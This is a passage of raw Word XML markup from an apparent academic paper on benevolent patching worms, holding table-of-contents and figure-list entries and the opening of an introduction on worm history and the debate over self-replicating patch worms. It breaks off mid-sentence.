            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>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hyperlink w:anchor="_Toc321730223" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00B96D67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 3: Third Iteration</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730223 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>62</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>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hyperlink w:anchor="_Toc321730224" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00B96D67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 4: Hop Traversal</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730224 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>62</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="003D2C00" w:rsidRDefault="009349AB" w:rsidP="00B63226">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end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F045E" w:rsidRPr="004758BF" w:rsidRDefault="009F045E" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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3D2C00" w:rsidRPr="00861880" w:rsidRDefault="003D2C00" w:rsidP="004758BF">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc321736776"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>List of Figures</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>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r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F045E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> TOC \h \z \c "Figure" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc321730225" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00490EED">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 1:  Exploit crashing service</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730225 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>48</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>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hyperlink w:anchor="_Toc321730226" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00490EED">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 2: System rebooting after crash by exploit</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730226 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>49</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="006E2046" w:rsidRDefault="009349AB" w:rsidP="006E2046">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc321730227" w:history="1">
        <w:r w:rsidR="006E2046" w:rsidRPr="00490EED">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 3: Successful exploit without crash</w:t>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc321730227 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="006E2046">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>50</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00E915B1" w:rsidRDefault="009349AB" w:rsidP="009F045E">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end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D42E48" w:rsidRDefault="00D42E48" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00D42E48" w:rsidSect="00332E5B">
          <w:headerReference w:type="default" r:id="rId10"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="706" w:footer="706" w:gutter="0"/>
          <w:pgNumType w:fmt="lowerRoman"/>
          <w:cols w:space="708"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="0025001B">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc321736777"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0025001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Since as early as 1949, the idea of a self-replicating computer program has been theorized (von Neumann</w:t>
      </w:r>
      <w:r>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1966).  Today we see this theory put into practice by the number of computer viruses, tr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ojans, and worms in existence.  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The usual purpose of these self-replicating programs is to infect vulnerable systems and execute a malicious payload such as file deletion, e-mail spamming, denial of service attacks, login credential stealing, </w:t>
      </w:r>
      <w:r w:rsidR="00DF0A24">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>theft of money via online banking compromise (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FoxNews</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>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 xml:space="preserve">2009).  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00C952D8"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Over the last few decades the traditional response to the</w:t>
      </w:r>
      <w:r w:rsidR="00674FF1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">se malicious programs has been </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">anti-virus software.  This software relies on obtaining signatures or patterns of the malicious programs so they can be </w:t>
      </w:r>
      <w:r w:rsidR="00E1736F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>detected and blocked or removed</w:t>
      </w:r>
      <w:r w:rsidR="00B37440">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  This has</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> led to a </w:t>
      </w:r>
      <w:r w:rsidR="00B37440">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">game of </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">cat-and-mouse between the anti-virus vendors and the malicious program </w:t>
      </w:r>
      <w:r w:rsidR="00B37440">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>creators</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  The growth of the Internet has interconnected millions of computing devices on a large shared network</w:t>
      </w:r>
      <w:r w:rsidR="00B37440">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> which</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> has led to the adaptation by malicious program writers to move from the traditional virus model of attaching to an executable or disk file the user executes or opens to full self-replicating computer worms</w:t>
      </w:r>
      <w:r w:rsidR="00B37440">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that spread across the network</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  These programs start by infecting a machine on a network and then spread themselves automatically to other machines through </w:t>
      </w:r>
      <w:r w:rsidR="00B37440">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">exploitation of </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">unpatched software on other machines.  The success of these worms comes primarily from </w:t>
      </w:r>
      <w:r w:rsidR="00070774">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> larger user base of the Internet</w:t>
      </w:r>
      <w:r w:rsidR="00070774">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> which</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> has users who do not regularly patch their computer software.  This has allowed malicious persons to gain control of tens of thousands of computing devices to execute code to steal data or attack other net</w:t>
      </w:r>
      <w:r w:rsidR="00070774">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">works at their desire (Schneier </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2007).  In some cases the victim of the infection doesn't even know their machine has been taken over or is susceptible to being taken over.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00FD5A2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B26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Anti-virus companies, operating system companies, and IT organizations have attempted to keep up with the growing threat, but their efforts can still not fully prevent infection on every machine.  In some cases the malicious program even has the ability to disable anti-virus and software update programs so as to retain control</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the infected machine (Leung </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2009).  Some newer emergent technologies are being actively developed and slowly deployed that, in some cases, can detect a machine that has been infected so as to disconnect it from the network to reduce infection of other machines, but these have not gained wide popularity nor been thoroughly evaluated for effectiven</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ess (Pauli </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2010).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="007360D2"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Yet another method that has been proposed multiple times before but not accepted by the security community at large as plausible is to write a computer worm that is self-replicating</w:t>
      </w:r>
      <w:r>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but instead of infecting and taking control of machines it would patch them </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to close the vulnerability in the system</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  This type of program is known as a "benevolent worm" (Schneier</w:t>
      </w:r>
      <w:r>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2003).  The major reason</w:t>
      </w:r>
      <w:r w:rsidR="00BD5714">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that,</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> until </w:t>
      </w:r>
      <w:r w:rsidR="00BD5714">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">recently, </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the industry and academic communit</w:t>
      </w:r>
      <w:r w:rsidR="00BD5714">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ies</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as a whole ha</w:t>
      </w:r>
      <w:r w:rsidR="00BD5714">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ve</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rejected this idea is that computer programs by human nature are likely to have coding errors or bugs which can caus</w:t>
      </w:r>
      <w:r w:rsidR="00BD5714">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e unexpected behavior (Schneier </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2003).  The risk of a benevolent worm causing more damage when it was intended to repair was considered not worth the benefit of the protection.  Major questions such as what if it unknowingly brought down a major power-grid system or caused a critical hospital system to crash hav</w:t>
      </w:r>
      <w:r w:rsidR="00CE6CC7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e been asked.  The most recent</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> opinion, however, is that the large number of infected systems under the control of persons with unknown or malicious intent is more dangerous now than these possible risks from a benevolent worm (Schneier 2011).  Also the possibility of critical systems such as nuclear power plant control systems being vulnerable (NRC 2003) and going unnoticed by the operations personnel for that system poses more of a risk to being susceptible to unknown and malicious persons versus an out </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>of control benevolent worm.  This paper will address the risks of benevolent worms for use as a way to combat malicious sof</w:t>
      </w:r>
      <w:r w:rsidR="00CE6CC7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
